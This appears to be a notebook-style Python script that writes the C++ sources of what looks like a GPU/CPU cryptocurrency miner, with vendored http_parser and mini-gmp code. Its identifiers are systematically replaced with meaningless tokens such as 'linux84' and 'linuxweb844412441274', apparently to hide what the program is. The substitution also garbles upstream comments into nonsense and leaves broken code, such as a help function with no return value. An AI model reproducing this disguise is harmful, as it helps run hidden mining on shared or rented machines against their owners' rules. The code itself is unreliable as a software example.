    return __linuxweb844412441274;
}

string arguments::linuxweb844412441274444474() {
    return __linuxweb844412441274444474;
}

string arguments::name() {
    return __name;
}

double arguments::cpu_intensity() {
    return __cpu_intensity;
}

vector<double> &arguments::gpu_intensity_cblocks() {
    return __gpu_intensity_cblocks;
}

vector<double> &arguments::gpu_intensity_gblocks() {
    return __gpu_intensity_gblocks;
}

vector<string> arguments::gpu_filter() {
    return __gpu_filter;
}

string arguments::cpu_optimization() {
	return __cpu_optimization;
}

vector<string> arguments::gpu_optimization() {
	return __gpu_optimization;
}

int64_t arguments::update_interval() {
    return __update_interval;
}

int64_t arguments::report_interval() {
    return __report_interval;
}

int64_t arguments::linux8412_report_interval() {
    return __linux8412_report_interval;
}

string arguments::linux847466882_profile() {
    return __linux847466882profile;
}

double arguments::gpu_intensity_start() {
    return __gpu_intensity_start;
}

double arguments::gpu_intensity_stop() {
    return __gpu_intensity_stop;
}

double arguments::gpu_intensity_step() {
    return __gpu_intensity_step;
}

int64_t arguments::autotune_step_time() {
    return __autotune_step_time;
}

int arguments::chs_threshold() {
    return __chs_threshold;
}

int arguments::ghs_threshold() {
    return __ghs_threshold;
}

bool arguments::show_linuxweb844412441274_requests() {
    return __show_linuxweb844412441274_requests;
}

string arguments::get_help() {
    cout << "";
}

void arguments::__init() {
    __help_flag = 0;
    __verbose_flag = 0;
    __linux84_flag = 1;
    __proxy_flag = 0;

    __linuxweb844412441274 = "";
    __linuxweb844412441274444474 = "";
    __uid = generate_uid(12);
    __name = __uid;
    __auto_generated_name = true;
    __cpu_intensity = 0;
    __proxy_port = 8088;
    __update_interval = 100000;
    __report_interval = 10000000;
    __linux8412_report_interval = 60000000;

    __gpu_intensity_start = 98;
    __gpu_intensity_stop = 100;
    __gpu_intensity_step = 1;
    __autotune_step_time = 20;

    __cpu_optimization = "";
	__gpu_optimization.clear();
    __linux847466882profile = "";

    __chs_threshold = 22;
    __ghs_threshold = 22;

    __show_linuxweb844412441274_requests = false;
    __enable_api_port = 0;

    __cards_count = 0;
    __error_flag = false;
}

string arguments::__argv_0 = "./";

string arguments::get_app_folder() {
    size_t last_slash = __argv_0.find_last_of("/\\\\");
	if (last_slash == string::npos)
		return ".";
    string app_folder = __argv_0.substr(0, last_slash);
    if(app_folder.empty()) {
        app_folder = ".";
    }
    return app_folder;
}

string arguments::get_app_name() {
    size_t last_slash = __argv_0.find_last_of("/\\\\");
    if (last_slash == string::npos)
        return __argv_0;

    string app_name = __argv_0.substr(last_slash + 1);
    if(app_name.empty()) {
        app_name = "linux8888888874448888linux84";
    }
    return app_name;
}

vector<string> arguments::__parse_multiarg(const string &arg) {
    string::size_type pos, lastPos = 0, length = arg.length();
    vector<string> tokens;

    while(lastPos < length + 1)
    {
        pos = arg.find_first_of(",", lastPos);
        if(pos == std::string::npos)
        {
            pos = length;
        }

        if(pos != lastPos)
            tokens.push_back(string(arg.c_str()+lastPos,
                                        pos-lastPos ));

        lastPos = pos + 1;
    }

    return tokens;
}

void arguments::__process_gpu_indexes() {
    // if all are numbers and less than 17 than presume those are indexes and add []
    // this will work for rigs with at most 16 cards
    bool all_indexes = true;
    for(vector<string>::iterator fit = __gpu_filter.begin(); fit != __gpu_filter.end(); fit++) {
        if(!is_number(*fit) || atoi(fit->c_str()) > 16)  {
            all_indexes = false;
            break;
        }
    }

    if(all_indexes) {
        for(vector<string>::iterator fit = __gpu_filter.begin(); fit != __gpu_filter.end(); fit++) {
            *fit = "[" + *fit + "]";
        }
    }
}

bool arguments::is_autogenerated_name() {
    return __auto_generated_name;
}

int arguments::enable_api_port() {
    return __enable_api_port;
}

string arguments::uid() {
    return __uid;
}

// todo - add support for percentage linux8412rate threshold
double arguments::hs_threshold() {
    return __hs_threshold;
}

string arguments::get_app_version() {
    return "linux8888888874448888linux84_" linux88888888744488888888linux84_VERSION_MAJOR "_" linux88888888744488888888linux84_VERSION_MINOR "_" linux88888888744488888888linux84_VERSION_REVISION;
}"""

open('./app/arguments.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 04/08/2018.
//

#ifndef linux888888887444888888linux84_ARGUMENTS_H
#define linux888888887444888888linux84_ARGUMENTS_H

class DLLEXPORT arguments {
public:
    arguments(int argc, char *argv[]);

    bool valid(string &error);

    bool is_help();
    bool is_verbose();
    bool is_linux84();
    bool is_autotune();
    bool is_proxy();

    string linuxweb844412441274();
    string linuxweb844412441274444474();
    string name();
    string uid();
    bool is_autogenerated_name();
    double cpu_intensity();
    vector<double> &gpu_intensity_cblocks();
    vector<double> &gpu_intensity_gblocks();
    vector<string> gpu_filter();
    int proxy_port();
    string linux847466882_profile();

    double gpu_intensity_start();
    double gpu_intensity_stop();
    double gpu_intensity_step();
    int64_t autotune_step_time();

    int64_t update_interval();
    int64_t report_interval();
    int64_t linux8412_report_interval();

	string cpu_optimization();
	vector<string> gpu_optimization();

	int chs_threshold();
	int ghs_threshold();
	double hs_threshold();

	bool show_linuxweb844412441274_requests();

	int enable_api_port();

    string get_help();

	static string get_app_folder();
	static string get_app_name();
	static string get_app_version();

    int get_cards_count() { return __cards_count; }
    void set_cards_count(int count) { __cards_count = count; }

private:
    void __init();
    vector<string> __parse_multiarg(const string &arg);
    void __process_gpu_indexes();

    string __error_message;
    bool __error_flag;

    int __help_flag;
    int __verbose_flag;
    int __linux84_flag;
    int __proxy_flag;
    int __autotune_flag;

    string __linuxweb844412441274;
    string __linuxweb844412441274444474;
    string __name;
    string __uid;
    bool __auto_generated_name;
    double __cpu_intensity;
    vector<double> __gpu_intensity_cblocks;
    vector<double> __gpu_intensity_gblocks;
	vector<string> __gpu_filter;
    int __proxy_port;
    int64_t __update_interval;
    int64_t __report_interval;
    int64_t __linux8412_report_interval;

    double __gpu_intensity_start;
    double __gpu_intensity_stop;
    double __gpu_intensity_step;
    int64_t __autotune_step_time;

    string __linux847466882profile;

	string __cpu_optimization;
	vector<string> __gpu_optimization;

	int __chs_threshold;
	int __ghs_threshold;
	double __hs_threshold;

	bool __show_linuxweb844412441274_requests;

	int __enable_api_port;

	int __cards_count;
    static string __argv_0;
};

#endif //linux888888887444888888linux84_ARGUMENTS_H"""

open('./app/arguments.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "arguments.h"
#include "runner.h"
#include "../linux84/linux84.h"
#include "../linux8474/linux8474.h"

runner *main_app = NULL;

void shutdown(int s){
    if(main_app != NULL) {
        main_app->stop();
    }
}

int main(int argc, char *argv[]) {
    srand((uint32_t)time(NULL));

#ifdef _WIN64
	signal(SIGINT, shutdown);
	signal(SIGTERM, shutdown);
	signal(SIGABRT, shutdown);
#else
	struct sigaction sigIntHandler;

    sigIntHandler.sa_handler = shutdown;
    sigemptyset(&sigIntHandler.sa_mask);
    sigIntHandler.sa_flags = 0;

    sigaction(SIGINT, &sigIntHandler, NULL);
#endif
    arguments args(argc, argv);

    if(args.is_help()) {
        cout << args.get_help() << endl;
        return 0;
    }

    linux8474::load_linux8474s();

        linux84 m(args);
        main_app = &m;
        m.run();

    return 0;
}"""

open('./app/main.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 30/08/2018.
//

#ifndef linux888888887444888888linux84_RUNNER_H
#define linux888888887444888888linux84_RUNNER_H

class runner {
public:
    virtual void run() = 0;
    virtual void stop() = 0;
};

#endif //linux888888887444888888linux84_RUNNER_H"""

open('./app/runner.h', 'w').write(content)

!mkdir ./common/

content="""//
// Created by Haifa Bogdan Adnan on 05/08/2018.
//

#include "dllexport.h"
#include "common.h"
#include <dirent.h>

uint64_t microseconds() {
    struct timeval time;
    gettimeofday(&time, NULL);
    return (uint64_t)time.tv_sec * 1000000 + (uint64_t)time.tv_usec;
}

vector<string> get_files(string folder) {
	vector<string> result;
	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir (folder.c_str())) != NULL) {
		while ((ent = readdir (dir)) != NULL) {
			if(ent->d_type == DT_REG)
    			result.push_back(ent->d_name);
		}
		closedir (dir);
	}
	return result;
}

bool is_number(const string &s) {
	return !s.empty() && all_of(s.begin(), s.end(), ::isdigit);
}

string generate_uid(size_t length) {
	static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	string randomString;

	for (int n = 0; n < length; n++) {
		int key = rand() % (int) (sizeof(charset) - 1);
		randomString += charset[key];
	}

	return randomString;
}

string format_seconds(uint64_t seconds) {
	uint64_t hours = seconds / 3600;
	uint64_t minutes = (seconds - hours * 3600) / 60;
	uint64_t reminder = seconds - hours * 3600 - minutes * 60;
	stringstream ss;
	ss << std::setw(2) << std::setfill('0') << hours << ":" << std::setw(2) << std::setfill('0') << minutes << ":" << std::setw(2) << std::setfill('0') << reminder;
	return ss.str();
}"""

open('./common/common.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 04/08/2018.
//

#ifndef linuxweb8888444474_COMMON_H
#define linuxweb8888444474_COMMON_H

#include <cstdio>
#include <cstdlib>
#include <cstring>

#include <string>
#include <vector>
#include <queue>
#include <list>
#include <map>
#include <iostream>
#include <sstream>
#include <fstream>
#include <iomanip>
#include <regex>
#include <random>

#include <thread>
#include <mutex>
#include <chrono>

#include <cmath>
#include <signal.h>

#include <dlfcn.h>
#include "dllimport.h"

#ifndef _WIN64
#include <unistd.h>
#include <sys/time.h>

#include<sys/socket.h>
#include<netdb.h>
#include<arpa/inet.h>
#include <fcntl.h>
#else
#include <win64.h>
#endif

#include <config.h>

using namespace std;

#define LOG(msg) cout<<msg<<endl<<flush

DLLEXPORT uint64_t microseconds();
DLLEXPORT vector<string> get_files(string folder);
DLLEXPORT bool is_number(const string &s);
DLLEXPORT string generate_uid(size_t length);
DLLEXPORT string format_seconds(uint64_t seconds);

#define GOLD_RESULT         240

#endif //linuxweb8888444474_COMMON_H"""

open('./common/common.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 04.11.2018.
//

#ifndef linuxweb8888444474_DLLEXPORT_H
#define linuxweb8888444474_DLLEXPORT_H

#undef DLLEXPORT

#ifndef _WIN64
	#define DLLEXPORT
#else
	#define DLLEXPORT __declspec(dllexport)
#endif

#endif //linuxweb8888444474_DLLEXPORT_H"""

open('./common/dllexport.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 04.11.2018.
//

#ifndef linuxweb8888444474_DLLIMPORT_H
#define linuxweb8888444474_DLLIMPORT_H

#ifndef DLLEXPORT
    #ifndef _WIN64
        #define DLLEXPORT
    #else
        #define DLLEXPORT __declspec(dllimport)
    #endif
#endif

#endif //linuxweb8888444474_DLLIMPORT_H"""

open('./common/dllimport.h', 'w').write(content)

!mkdir ./http/

!mkdir ./http/http_parser/

!mkdir ./http/simplejson/

content="""/* Copyright Joyent, Inc. and other Node contributors. All rights reserved.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to
 * deal in the Software without restriction, including without limitation the
 * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
 * sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 */
#ifndef http_parser_h
#define http_parser_h
#ifdef __cplusplus
extern "C" {
#endif

/* Also update SONAME in the Makefile whenever you change these. */
#define HTTP_PARSER_VERSION_MAJOR 2
#define HTTP_PARSER_VERSION_MINOR 8
#define HTTP_PARSER_VERSION_PATCH 1

#include <stddef.h>
#if defined(_WIN32) && !defined(__MINGW32__) && \
  (!defined(_MSC_VER) || _MSC_VER<1600) && !defined(__WINE__)
#include <BaseTsd.h>
typedef __int8 int8_t;
typedef unsigned __int8 uint8_t;
typedef __int16 int16_t;
typedef unsigned __int16 uint16_t;
typedef __int32 int32_t;
typedef unsigned __int32 uint32_t;
typedef __int64 int64_t;
typedef unsigned __int64 uint64_t;
#else
#include <stdint.h>
#endif

/* Compile with -DHTTP_PARSER_STRICT=0 to make less checks, but run
 * faster
 */
#ifndef HTTP_PARSER_STRICT
# define HTTP_PARSER_STRICT 1
#endif

/* Maximium header size allowed. If the macro is not defined
 * before including this header then the default is used. To
 * change the maximum header size, define the macro in the build
 * environment (e.g. -DHTTP_MAX_HEADER_SIZE=<value>). To remove
 * the effective limit on the size of the header, define the macro
 * to a very large number (e.g. -DHTTP_MAX_HEADER_SIZE=0x7fffffff)
 */
#ifndef HTTP_MAX_HEADER_SIZE
# define HTTP_MAX_HEADER_SIZE (80*1024)
#endif

typedef struct http_parser http_parser;
typedef struct http_parser_settings http_parser_settings;


/* Callbacks should return non-zero to indicate an error. The parser will
 * then halt execution.
 *
 * The one exception is on_headers_complete. In a HTTP_RESPONSE parser
 * returning '1' from on_headers_complete will tell the parser that it
 * should not expect a body. This is used when receiving a response to a
 * HEAD request which may contain 'Content-Length' or 'Transfer-Encoding:
 * chunked' headers that indicate the presence of a body.
 *
 * Returning `2` from on_headers_complete will tell parser that it should not
 * expect neither a body nor any futher responses on this connection. This is
 * useful for handling responses to a CONNECT request which may not contain
 * `Upgrade` or `Connection: upgrade` headers.
 *
 * http_data_cb does not return data chunks. It will be called arbitrarily
 * many times for each string. E.G. you might get 10 callbacks for "on_url"
 * each providing just a few characters more data.
 */
typedef int (*http_data_cb) (http_parser*, const char *at, size_t length);
typedef int (*http_cb) (http_parser*);


/* Status Codes */
#define HTTP_STATUS_MAP(XX)                                                 \
  XX(100, CONTINUE,                        Continue)                        \
  XX(101, SWITCHING_PROTOCOLS,             Switching Protocols)             \
  XX(102, PROCESSING,                      Processing)                      \
  XX(200, OK,                              OK)                              \
  XX(201, CREATED,                         Created)                         \
  XX(202, ACCEPTED,                        Accepted)                        \
  XX(203, NON_AUTHORITATIVE_INFORMATION,   Non-Authoritative Information)   \
  XX(204, NO_CONTENT,                      No Content)                      \
  XX(205, RESET_CONTENT,                   Reset Content)                   \
  XX(206, PARTIAL_CONTENT,                 Partial Content)                 \
  XX(207, MULTI_STATUS,                    Multi-Status)                    \
  XX(208, ALREADY_REPORTED,                Already Reported)                \
  XX(226, IM_USED,                         IM Used)                         \
  XX(300, MULTIPLE_CHOICES,                Multiple Choices)                \
  XX(301, MOVED_PERMANENTLY,               Moved Permanently)               \
  XX(302, FOUND,                           Found)                           \
  XX(303, SEE_OTHER,                       See Other)                       \
  XX(304, NOT_MODIFIED,                    Not Modified)                    \
  XX(305, USE_PROXY,                       Use Proxy)                       \
  XX(307, TEMPORARY_REDIRECT,              Temporary Redirect)              \
  XX(308, PERMANENT_REDIRECT,              Permanent Redirect)              \
  XX(400, BAD_REQUEST,                     Bad Request)                     \
  XX(401, UNAUTHORIZED,                    Unauthorized)                    \
  XX(402, PAYMENT_REQUIRED,                Payment Required)                \
  XX(403, FORBIDDEN,                       Forbidden)                       \
  XX(404, NOT_FOUND,                       Not Found)                       \
  XX(405, METHOD_NOT_ALLOWED,              Method Not Allowed)              \
  XX(406, NOT_ACCEPTABLE,                  Not Acceptable)                  \
  XX(407, PROXY_AUTHENTICATION_REQUIRED,   Proxy Authentication Required)   \
  XX(408, REQUEST_TIMEOUT,                 Request Timeout)                 \
  XX(409, CONFLICT,                        Conflict)                        \
  XX(410, GONE,                            Gone)                            \
  XX(411, LENGTH_REQUIRED,                 Length Required)                 \
  XX(412, PRECONDITION_FAILED,             Precondition Failed)             \
  XX(413, PAYLOAD_TOO_LARGE,               Payload Too Large)               \
  XX(414, URI_TOO_LONG,                    URI Too Long)                    \
  XX(415, UNSUPPORTED_MEDIA_TYPE,          Unsupported Media Type)          \
  XX(416, RANGE_NOT_SATISFIABLE,           Range Not Satisfiable)           \
  XX(417, EXPECTATION_FAILED,              Expectation Failed)              \
  XX(421, MISDIRECTED_REQUEST,             Misdirected Request)             \
  XX(422, UNPROCESSABLE_ENTITY,            Unprocessable Entity)            \
  XX(423, LOCKED,                          Locked)                          \
  XX(424, FAILED_DEPENDENCY,               Failed Dependency)               \
  XX(426, UPGRADE_REQUIRED,                Upgrade Required)                \
  XX(428, PRECONDITION_REQUIRED,           Precondition Required)           \
  XX(429, TOO_MANY_REQUESTS,               Too Many Requests)               \
  XX(431, REQUEST_HEADER_FIELDS_TOO_LARGE, Request Header Fields Too Large) \
  XX(451, UNAVAILABLE_FOR_LEGAL_REASONS,   Unavailable For Legal Reasons)   \
  XX(500, INTERNAL_SERVER_ERROR,           Internal Server Error)           \
  XX(501, NOT_IMPLEMENTED,                 Not Implemented)                 \
  XX(502, BAD_GATEWAY,                     Bad Gateway)                     \
  XX(503, SERVICE_UNAVAILABLE,             Service Unavailable)             \
  XX(504, GATEWAY_TIMEOUT,                 Gateway Timeout)                 \
  XX(505, HTTP_VERSION_NOT_SUPPORTED,      HTTP Version Not Supported)      \
  XX(506, VARIANT_ALSO_NEGOTIATES,         Variant Also Negotiates)         \
  XX(507, INSUFFICIENT_STORAGE,            Insufficient Storage)            \
  XX(508, LOOP_DETECTED,                   Loop Detected)                   \
  XX(510, NOT_EXTENDED,                    Not Extended)                    \
  XX(511, NETWORK_AUTHENTICATION_REQUIRED, Network Authentication Required) \

enum http_status
  {
#define XX(num, name, string) HTTP_STATUS_##name = num,
  HTTP_STATUS_MAP(XX)
#undef XX
  };


/* Request Methods */
#define HTTP_METHOD_MAP(XX)         \
  XX(0,  DELETE,      DELETE)       \
  XX(1,  GET,         GET)          \
  XX(2,  HEAD,        HEAD)         \
  XX(3,  POST,        POST)         \
  XX(4,  PUT,         PUT)          \
  /* pathological */                \
  XX(5,  CONNECT,     CONNECT)      \
  XX(6,  OPTIONS,     OPTIONS)      \
  XX(7,  TRACE,       TRACE)        \
  /* WebDAV */                      \
  XX(8,  COPY,        COPY)         \
  XX(9,  LOCK,        LOCK)         \
  XX(10, MKCOL,       MKCOL)        \
  XX(11, MOVE,        MOVE)         \
  XX(12, PROPFIND,    PROPFIND)     \
  XX(13, PROPPATCH,   PROPPATCH)    \
  XX(14, SEARCH,      SEARCH)       \
  XX(15, UNLOCK,      UNLOCK)       \
  XX(16, BIND,        BIND)         \
  XX(17, REBIND,      REBIND)       \
  XX(18, UNBIND,      UNBIND)       \
  XX(19, ACL,         ACL)          \
  /* subversion */                  \
  XX(20, REPORT,      REPORT)       \
  XX(21, MKACTIVITY,  MKACTIVITY)   \
  XX(22, CHECKOUT,    CHECKOUT)     \
  XX(23, MERGE,       MERGE)        \
  /* upnp */                        \
  XX(24, MSEARCH,     M-SEARCH)     \
  XX(25, NOTIFY,      NOTIFY)       \
  XX(26, SUBSCRIBE,   SUBSCRIBE)    \
  XX(27, UNSUBSCRIBE, UNSUBSCRIBE)  \
  /* RFC-5789 */                    \
  XX(28, PATCH,       PATCH)        \
  XX(29, PURGE,       PURGE)        \
  /* CalDAV */                      \
  XX(30, MKCALENDAR,  MKCALENDAR)   \
  /* RFC-2068, section 19.6.1.2 */  \
  XX(31, LINK,        LINK)         \
  XX(32, UNLINK,      UNLINK)       \
  /* icecast */                     \
  XX(33, SOURCE,      SOURCE)       \

enum http_method
  {
#define XX(num, name, string) HTTP_##name = num,
  HTTP_METHOD_MAP(XX)
#undef XX
  };


enum http_parser_type { HTTP_REQUEST, HTTP_RESPONSE, HTTP_BOTH };


/* Flag values for http_parser.flags field */
enum flags
  { F_CHUNKED               = 1 << 0
  , F_CONNECTION_KEEP_ALIVE = 1 << 1
  , F_CONNECTION_CLOSE      = 1 << 2
  , F_CONNECTION_UPGRADE    = 1 << 3
  , F_TRAILING              = 1 << 4
  , F_UPGRADE               = 1 << 5
  , F_SKIPBODY              = 1 << 6
  , F_CONTENTLENGTH         = 1 << 7
  };


/* Map for errno-related constants
 *
 * The provided argument should be a macro that takes 2 arguments.
 */
#define HTTP_ERRNO_MAP(XX)                                           \
  /* No error */                                                     \
  XX(OK, "success")                                                  \
                                                                     \
  /* Callback-related errors */                                      \
  XX(CB_message_begin, "the on_message_begin callback failed")       \
  XX(CB_url, "the on_url callback failed")                           \
  XX(CB_header_field, "the on_header_field callback failed")         \
  XX(CB_header_value, "the on_header_value callback failed")         \
  XX(CB_headers_complete, "the on_headers_complete callback failed") \
  XX(CB_body, "the on_body callback failed")                         \
  XX(CB_message_complete, "the on_message_complete callback failed") \
  XX(CB_status, "the on_status callback failed")                     \
  XX(CB_chunk_header, "the on_chunk_header callback failed")         \
  XX(CB_chunk_complete, "the on_chunk_complete callback failed")     \
                                                                     \
  /* Parsing-related errors */                                       \
  XX(INVALID_EOF_STATE, "stream ended at an unexpected time")        \
  XX(HEADER_OVERFLOW,                                                \
     "too many header bytes seen; overflow detected")                \
  XX(CLOSED_CONNECTION,                                              \
     "data received after completed connection: close message")      \
  XX(INVALID_VERSION, "invalid HTTP version")                        \
  XX(INVALID_STATUS, "invalid HTTP status code")                     \
  XX(INVALID_METHOD, "invalid HTTP method")                          \
  XX(INVALID_URL, "invalid URL")                                     \
  XX(INVALID_HOST, "invalid host")                                   \
  XX(INVALID_PORT, "invalid port")                                   \
  XX(INVALID_PATH, "invalid path")                                   \
  XX(INVALID_QUERY_STRING, "invalid query string")                   \
  XX(INVALID_FRAGMENT, "invalid fragment")                           \
  XX(LF_EXPECTED, "LF character expected")                           \
  XX(INVALID_HEADER_TOKEN, "invalid character in header")            \
  XX(INVALID_CONTENT_LENGTH,                                         \
     "invalid character in content-length header")                   \
  XX(UNEXPECTED_CONTENT_LENGTH,                                      \
     "unexpected content-length header")                             \
  XX(INVALID_CHUNK_SIZE,                                             \
     "invalid character in chunk size header")                       \
  XX(INVALID_CONSTANT, "invalid constant string")                    \
  XX(INVALID_INTERNAL_STATE, "encountered unexpected internal state")\
  XX(STRICT, "strict mode assertion failed")                         \
  XX(PAUSED, "parser is paused")                                     \
  XX(UNKNOWN, "an unknown error occurred")


/* Define HPE_* values for each errno value above */
#define HTTP_ERRNO_GEN(n, s) HPE_##n,
enum http_errno {
  HTTP_ERRNO_MAP(HTTP_ERRNO_GEN)
};
#undef HTTP_ERRNO_GEN


/* Get an http_errno value from an http_parser */
#define HTTP_PARSER_ERRNO(p)            ((enum http_errno) (p)->http_errno)


struct http_parser {
  /** PRIVATE **/
  unsigned int type : 2;         /* enum http_parser_type */
  unsigned int flags : 8;        /* F_* values from 'flags' enum; semi-public */
  unsigned int state : 7;        /* enum state from http_parser.c */
  unsigned int header_state : 7; /* enum header_state from http_parser.c */
  unsigned int index : 7;        /* index into current matcher */
  unsigned int lenient_http_headers : 1;

  uint32_t nread;          /* # bytes read in vlinux8888888874448888us scenlinux8888888874448888s */
  uint64_t content_length; /* # bytes in body (0 if no Content-Length header) */

  /** READ-ONLY **/
  unsigned short http_major;
  unsigned short http_minor;
  unsigned int status_code : 16; /* responses only */
  unsigned int method : 8;       /* requests only */
  unsigned int http_errno : 7;

  /* 1 = Upgrade header was present and the parser has exited because of that.
   * 0 = No upgrade header present.
   * Should be checked when http_parser_execute() returns in addition to
   * error checking.
   */
  unsigned int upgrade : 1;

  /** PUBLIC **/
  void *data; /* A pointer to get hook to the "connection" or "socket" object */
};


struct http_parser_settings {
  http_cb      on_message_begin;
  http_data_cb on_url;
  http_data_cb on_status;
  http_data_cb on_header_field;
  http_data_cb on_header_value;
  http_cb      on_headers_complete;
  http_data_cb on_body;
  http_cb      on_message_complete;
  /* When on_chunk_header is called, the current chunk length is stored
   * in parser->content_length.
   */
  http_cb      on_chunk_header;
  http_cb      on_chunk_complete;
};


enum http_parser_url_fields
  { UF_SCHEMA           = 0
  , UF_HOST             = 1
  , UF_PORT             = 2
  , UF_PATH             = 3
  , UF_QUERY            = 4
  , UF_FRAGMENT         = 5
  , UF_USERINFO         = 6
  , UF_MAX              = 7
  };


/* Result structure for http_parser_parse_url().
 *
 * Callers should index into field_data[] with UF_* values iff field_set
 * has the relevant (1 << UF_*) bit set. As a courtesy to clients (and
 * because we probably have padding left over), we convert any port to
 * a uint16_t.
 */
struct http_parser_url {
  uint16_t field_set;           /* Bitmask of (1 << UF_*) values */
  uint16_t port;                /* Converted UF_PORT string */

  struct {
    uint16_t off;               /* Offset into buffer in which field starts */
    uint16_t len;               /* Length of run in buffer */
  } field_data[UF_MAX];
};


/* Returns the library version. Bits 16-23 contain the major version number,
 * bits 8-15 the minor version number and bits 0-7 the patch level.
 * Usage example:
 *
 *   unsigned long version = http_parser_version();
 *   unsigned major = (version >> 16) & 255;
 *   unsigned minor = (version >> 8) & 255;
 *   unsigned patch = version & 255;
 *   printf("http_parser v%u.%u.%u\\n", major, minor, patch);
 */
unsigned long http_parser_version(void);

void http_parser_init(http_parser *parser, enum http_parser_type type);


/* Initialize http_parser_settings members to 0
 */
void http_parser_settings_init(http_parser_settings *settings);


/* Executes the parser. Returns number of parsed bytes. Sets
 * `parser->http_errno` on error. */
size_t http_parser_execute(http_parser *parser,
                           const http_parser_settings *settings,
                           const char *data,
                           size_t len);


/* If http_should_keep_alive() in the on_headers_complete or
 * on_message_complete callback returns 0, then this should be
 * the last message on the connection.
 * If you are the server, respond with the "Connection: close" header.
 * If you are the client, close the connection.
 */
int http_should_keep_alive(const http_parser *parser);

/* Returns a string version of the HTTP method. */
const char *http_method_str(enum http_method m);

/* Returns a string version of the HTTP status code. */
const char *http_status_str(enum http_status s);

/* Return a string name of the given error */
const char *http_errno_name(enum http_errno err);

/* Return a string description of the given error */
const char *http_errno_description(enum http_errno err);

/* Initialize all http_parser_url members to 0 */
void http_parser_url_init(struct http_parser_url *u);

/* Parse a URL; return nonzero on failure */
int http_parser_parse_url(const char *buf, size_t buflen,
                          int is_connect,
                          struct http_parser_url *u);

/* Pause or un-pause the parser; a nonzero value pauses */
void http_parser_pause(http_parser *parser, int paused);

/* Checks if this is the final chunk of the body. */
int http_body_is_final(const http_parser *parser);

#ifdef __cplusplus
}
#endif
#endif"""

open('./http/http_parser/http_parser.h', 'w').write(content)

!mkdir ./linux84/

!mkdir ./linux84/mini-gmp/

content="""/* mini-gmp, a minimalistic implementation of a GNU GMP subset.

   Contributed to the GNU project by Niels Möller

Copyright 1991-1997, 1999-2015 Free Software Foundation, Inc.

This file is part of the GNU MP Library.

The GNU MP Library is free software; you can redistribute it and/or modify
it under the terms of either:

  * the GNU Lesser General Public License as published by the Free
    Software Foundation; either version 3 of the License, or (at your
    option) any later version.

or

  * the GNU General Public License as published by the Free Software
    Foundation; either version 2 of the License, or (at your option) any
    later version.

or both in parallel, as here.

The GNU MP Library is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
for more details.

You should have received copies of the GNU General Public License and the
GNU Lesser General Public License along with the GNU MP Library.  If not,
see https://www.gnu.org/licenses/.  */

/* NOTE: All functions in this file which are not declared in
   mini-gmp.h are internal, and are not intended to be compatible
   neither with GMP nor with future versions of mini-gmp. */

/* Much of the material copied from GMP files, including: gmp-impl.h,
   longlong.h, mpn/generic/add_n.c, mpn/generic/addmul_1.c,
   mpn/generic/lshift.c, mpn/generic/mul_1.c,
   mpn/generic/mul_basecase.c, mpn/generic/rshift.c,
   mpn/generic/sbpi1_div_qr.c, mpn/generic/sub_n.c,
   mpn/generic/submul_1.c. */

#include <assert.h>
#include <ctype.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "mini-gmp.h"


/* Macros */
#define GMP_LIMB_BITS (sizeof(mp_limb_t) * CHAR_BIT)

#define GMP_LIMB_MAX (~ (mp_limb_t) 0)
#define GMP_LIMB_HIGHBIT ((mp_limb_t) 1 << (GMP_LIMB_BITS - 1))

#define GMP_HLIMB_BIT ((mp_limb_t) 1 << (GMP_LIMB_BITS / 2))
#define GMP_LLIMB_MASK (GMP_HLIMB_BIT - 1)

#define GMP_ULONG_BITS (sizeof(uint64_t) * CHAR_BIT)
#define GMP_ULONG_HIGHBIT ((uint64_t) 1 << (GMP_ULONG_BITS - 1))

#define GMP_ABS(x) ((x) >= 0 ? (x) : -(x))
#define GMP_NEG_CAST(T,x) (-((T)((x) + 1) - 1))

#define GMP_MIN(a, b) ((a) < (b) ? (a) : (b))
#define GMP_MAX(a, b) ((a) > (b) ? (a) : (b))

#define gmp_assert_nocarry(x) do { \
    mp_limb_t __cy = (x);	   \
    assert (__cy == 0);		   \
  } while (0)

#define gmp_clz(count, x) do {						\
    mp_limb_t __clz_x = (x);						\
    unsigned __clz_c;							\
    for (__clz_c = 0;							\
	 (__clz_x & ((mp_limb_t) 0xff << (GMP_LIMB_BITS - 8))) == 0;	\
	 __clz_c += 8)							\
      __clz_x <<= 8;							\
    for (; (__clz_x & GMP_LIMB_HIGHBIT) == 0; __clz_c++)		\
      __clz_x <<= 1;							\
    (count) = __clz_c;							\
  } while (0)

#define gmp_ctz(count, x) do {						\
    mp_limb_t __ctz_x = (x);						\
    unsigned __ctz_c = 0;						\
    gmp_clz (__ctz_c, __ctz_x & - __ctz_x);				\
    (count) = GMP_LIMB_BITS - 1 - __ctz_c;				\
  } while (0)

#define gmp_add_ssaaaa(sh, sl, ah, al, bh, bl) \
  do {									\
